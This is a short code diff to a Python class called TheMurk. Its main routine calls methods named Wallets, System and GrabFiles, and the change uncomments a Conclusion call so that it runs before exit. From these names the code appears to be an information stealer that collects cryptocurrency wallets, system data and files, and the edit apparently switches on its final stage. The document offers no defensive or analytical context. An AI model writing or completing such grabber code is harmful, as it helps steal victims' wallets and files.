@@ -46,7 +46,7 @@ class TheMurk:
         self.Wallets()
         self.System()
         self.GrabFiles()
-        #self.Conclusion()
+        self.Conclusion()
         exit()
 
     def Start(self):
